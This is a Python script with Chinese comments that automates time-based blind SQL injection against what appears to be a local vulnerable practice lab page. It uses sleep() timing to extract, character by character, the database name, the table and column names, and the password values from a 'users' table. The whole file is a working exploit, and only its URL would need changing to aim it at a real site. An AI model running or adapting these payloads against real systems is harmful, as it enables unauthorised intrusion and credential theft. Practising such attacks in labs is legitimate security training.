# coding:utf-8
import time
import requests
import datetime

s = requests.session()
url = "http://127.0.0.1/dddd/vul/sqli/sqli_blind_t.php"  # 选择攻击的网址

# headers = {'cookie': ''}  # 需要登录的可以添加cookie值

# 爆破数据库的长度
for l in range(1, 25):
    # 这里对#和\都进行了url编码处理，在#好后将完整的url拼接起来,然后注意了，需要url转码，例如'需要变成%27
    # vince' and if(length(database())=7,sleep(1),0) #
    databaselen_payload = "?name=vince%27+and+if%28length%28database%28%29%29%3D"+str(l)+"%2Csleep%281%29%2C0%29+%23&submit=查询"
    # 记录请求前后时间
    time1 = datetime.datetime.now()
    r = s.get(url+databaselen_payload)
    time2 = datetime.datetime.now()
    # 对比时间差
    sec = (time2-time1).seconds
    if sec >= 1:
        database_len = l
        break
print("database_length:", str(database_len))

# 暴数据库的名
database_name = ''
for l in range(1, database_len+1):
    for i in range(1, 128):
        # 拼接完整的url ?name=vince' and if(ascii(substr(database(),"+str(l)+",1))="+str(i)+",sleep(1),1)#
        database_name_payload = "?name=vince%27+and+if%28ascii%28substr%28database%28%29%2C"+str(l)+"%2C1%29%29%3D"+str(i)+"%2Csleep%281%29%2C1%29+%23&submit=查询"
        # 记录请求前后时间
        time1 = datetime.datetime.now()
        r = s.get(url + database_name_payload)
        time2 = datetime.datetime.now()
        # 对比时间差
        sec = (time2 - time1).seconds
        if sec >= 1:
            database_name = database_name + chr(i)
            break
print('database_name:', database_name)

# 爆表的个数
for l in range(1, 50):
    # 拼接完整的url ?name=vince' and if((select count(table_name) from information_schema.tables where table_schema=database())="+str(l)+",sleep(1),0)#
    tablenumber_payload = "?name=vince%27+and+if%28%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D"+str(l)+"%2Csleep%281%29%2C0%29%23&submit=查询"
    # 记录请求前后时间
    time1 = datetime.datetime.now()
    r = s.get(url + tablenumber_payload)
    time2 = datetime.datetime.now()
    # 对比时间差
    sec = (time2 - time1).seconds
    if sec >= 1:
        tablenumber = l
        break
print('tablenumber:', tablenumber)

# 爆表名（老规矩，先爆破长度，再爆破内容）
for l in range(0, tablenumber):
    table_name = ''
    # 爆破长度
    for i in range(1, 25):
        # 拼接完整的url ?name=vince' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(l)+",1),1))="+str(i)+",sleep(2),0)#
        tablelen_payload = "?name=vince%27+and+if%28length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+"+str(l)+"%2C1%29%2C1%29%29%3D"+str(i)+"%2Csleep%282%29%2C0%29%23&submit=查询"
        # 记录请求前后时间
        time1 = datetime.datetime.now()
        r = s.get(url + tablelen_payload)
        time2 = datetime.datetime.now()
        # 对比时间差
        sec = (time2 - time1).seconds
        if sec >= 2:
            tablelen = i
            break
    print("table"+str(l+1)+":", tablelen)
    # 爆破名字
    for m in range(0, tablelen+1):
        for n in range(1, 128):
            # 拼接完整的url 这里需要注意下sleep的时间不能过短，我一开始设置的是1，结果就对了名字的一部分，这说明
            # ?name=vince' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(l)+",1),"+str(m)+",1))="+str(n)+",sleep(1),0)#
            tablename_payload = "?name=vince%27+and+if%28ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+"+str(l)+"%2C1%29%2C"+str(m)+"%2C1%29%29%3D"+str(n)+"%2Csleep%282%29%2C0%29%23&submit=查询"
            # 记录请求前后时间
            time3 = datetime.datetime.now()
            g = s.get(url + tablename_payload)
            time4 = datetime.datetime.now()
            # 对比时间差
            sec = (time4 - time3).seconds
            if sec >= 2:
                table_name = table_name + chr(n)
                break
    print("tablename"+str(l+1), ":", table_name)

# 爆列的个数
for l in range(1, 50):
    # 拼接完整的url ?name=vince' and if((select count(column_name) from information_schema.columns where table_name='users')="+str(l)+",sleep(2),0)#
    columnnumber_payload = "?name=vince%27+and+if%28%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27%29%3D"+str(l)+"%2Csleep%282%29%2C0%29%23&submit=查询"
    # 记录请求前后时间
    time1 = datetime.datetime.now()
    r = s.get(url + columnnumber_payload)
    time2 = datetime.datetime.now()
    # 对比时间差
    sec = (time2 - time1).seconds
    if sec >= 2:
        columnnumber = l
        break
print('columnnumber:', columnnumber)

# 爆列名（老规矩，先爆破长度，再爆破内容）
for l in range(0, columnnumber):
    column_name = ''
    # 爆破长度
    for i in range(1, 25):
        # 拼接完整的url ?name=vince' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit "+str(l)+",1),1))="+str(i)+",sleep(2),0)#
        columnlen_payload = "?name=vince%27+and+if%28length%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+"+str(l)+"%2C1%29%2C1%29%29%3D"+str(i)+"%2Csleep%282%29%2C0%29%23&submit=查询"
        # 记录请求前后时间
        time1 = datetime.datetime.now()
        r = s.get(url + columnlen_payload)
        time2 = datetime.datetime.now()
        # 对比时间差
        sec = (time2 - time1).seconds
        if sec >= 2:
            columnlen = i
            break
    print("column"+str(l+1), ":", columnlen)
    # 爆破名字
    for m in range(0, columnlen+1):
        for n in range(1, 128):
            # 拼接完整的url ?name=vince' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit "+str(l)+",1),"+str(m)+",1))="+str(n)+",sleep(2),0)#
            columnname_payload = "?name=vince%27+and+if%28ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+"+str(l)+"%2C1%29%2C"+str(m)+"%2C1%29%29%3D"+str(n)+"%2Csleep%282%29%2C0%29%23&submit=查询"
            # 记录请求前后时间
            time3 = datetime.datetime.now()
            g = s.get(url + columnname_payload)
            time4 = datetime.datetime.now()
            # 对比时间差
            sec = (time4 - time3).seconds
            if sec >= 2:
                column_name = column_name + chr(n)
                break
    print("tablename"+str(l+1), ":", column_name)

# 爆数据的条数
for l in range(1, 200):
    # 拼接完整的url   从users表中选password列   ?name=vince' and if((select count(password) from users)="+str(l)+",sleep(2),0)#
    datanumber_payload = "?name=vince%27+and+if%28%28select+count%28password%29+from+users%29%3D"+str(l)+"%2Csleep%282%29%2C0%29%23&submit=查询"
    # 记录请求前后时间
    time1 = datetime.datetime.now()
    r = s.get(url + datanumber_payload)
    time2 = datetime.datetime.now()
    # 对比时间差
    sec = (time2 - time1).seconds
    if sec >= 2:
        datanumber = l
        break
print('datenumber:', datanumber)

# 爆数据内容（老规矩，先爆破长度，再爆破内容）
for l in range(0, datanumber):
    data_name = ''
    # 爆破长度
    for i in range(1, 200):
        # 拼接完整的url ?name=vince' and if(length(substr((select password from users limit "+str(l)+",1),1))="+str(i)+",sleep(2),0)#
        datalen_payload = "?name=vince%27+and+if%28length%28substr%28%28select+password+from+users+limit+"+str(l)+"%2C1%29%2C1%29%29%3D"+str(i)+"%2Csleep%282%29%2C0%29%23&submit=查询"
        time1 = datetime.datetime.now()
        r = s.get(url + datalen_payload)
        time2 = datetime.datetime.now()
        # 对比时间差
        sec = (time2 - time1).seconds
        if sec >= 2:
            datalen = i
            break
    print("data"+str(l+1), ":", datalen)
    # 爆破名字
    for m in range(0, datalen+1):
        for n in range(1, 128):
            # 拼接完整的url ?name=vince' and if(ascii(substr((select password from users limit "+str(l)+",1),"+str(m)+",1))="+str(n)+" ,sleep(2),0)#
            dataname_payload = "?name=vince%27+and+if%28ascii%28substr%28%28select+password+from+users+limit+"+str(l)+"%2C1%29%2C"+str(m)+"%2C1%29%29%3D"+str(n)+"+%2Csleep%282%29%2C0%29%23&submit=查询"
            # 记录请求前后时间
            time3 = datetime.datetime.now()
            g = s.get(url + dataname_payload)
            time4 = datetime.datetime.now()
            # 对比时间差
            sec = (time4 - time3).seconds
            if sec >= 2:
                data_name = data_name + chr(n)
                break
    print("dataname"+str(l+1), ":", data_name)